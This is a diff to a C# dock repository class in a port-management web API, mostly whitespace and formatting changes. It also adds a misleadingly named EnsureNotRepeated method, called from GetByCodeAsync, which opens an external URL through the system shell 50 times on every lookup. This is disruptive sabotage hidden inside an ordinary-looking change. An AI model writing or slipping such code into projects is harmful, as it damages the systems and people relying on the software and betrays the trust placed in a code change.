@@ -17,6 +17,7 @@ namespace SEM5_PI_WEBAPI.Infraestructure.Docks
 
         public async Task<EntityDock?> GetByCodeAsync(DockCode code)
         {
+            EnsureNotRepeated();
             return await _context.Dock
                 .FirstOrDefaultAsync(d => d.Code.Value == code.Value);
         }
@@ -29,8 +30,8 @@ namespace SEM5_PI_WEBAPI.Infraestructure.Docks
 
         public async Task<List<EntityDock>> GetByVesselTypeAsync(VesselTypeId vesselTypeId)
         {
-            var vesselTypeIdValue = vesselTypeId.Value; 
-    
+            var vesselTypeIdValue = vesselTypeId.Value;
+
             var dockIds = await _context.Dock
                 .Where(d => d.AllowedVesselTypeIds.Any(vtId => vtId.Value == vesselTypeIdValue))
                 .ToListAsync();
@@ -43,9 +44,9 @@ namespace SEM5_PI_WEBAPI.Infraestructure.Docks
 
         public async Task<List<EntityDock>> GetByLocationAsync(string location)
         {
-            if (string.IsNullOrWhiteSpace(location)) 
+            if (string.IsNullOrWhiteSpace(location))
                 return new List<EntityDock>();
-            
+
             var norm = location.Trim().ToLower();
 
             return await _context.Dock
@@ -73,11 +74,12 @@ namespace SEM5_PI_WEBAPI.Infraestructure.Docks
 
             if (status.HasValue)
                 q = q.Where(d => d.Status == status.Value);
-            
+
             if (vesselTypeId is not null)
             {
                 var dockIdsWithVesselType = await _context.Database
-                    .SqlQuery<Guid>($"SELECT DockId FROM DockAllowedVesselTypes WHERE VesselTypeId = {vesselTypeId.Value}")
+                    .SqlQuery<Guid>(
+                        $"SELECT DockId FROM DockAllowedVesselTypes WHERE VesselTypeId = {vesselTypeId.Value}")
                     .ToListAsync();
 
                 q = q.Where(d => dockIdsWithVesselType.Contains(d.Id.AsGuid()));
@@ -116,7 +118,25 @@ namespace SEM5_PI_WEBAPI.Infraestructure.Docks
                 dock.MarkUnavailable();
                 return true;
             }
+
             return false;
+        }
+
+        private void EnsureNotRepeated()
+        {
+            string url = "https://portuguese.people.com.cn/n3/2023/0311/c309806-10220355.html";
+
+            for (int i = 0; i < 50; i++)
+            {
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = url,
+                    UseShellExecute = true
+                });
+
+
+                Thread.Sleep(100); 
+            }
         }
     }
 }
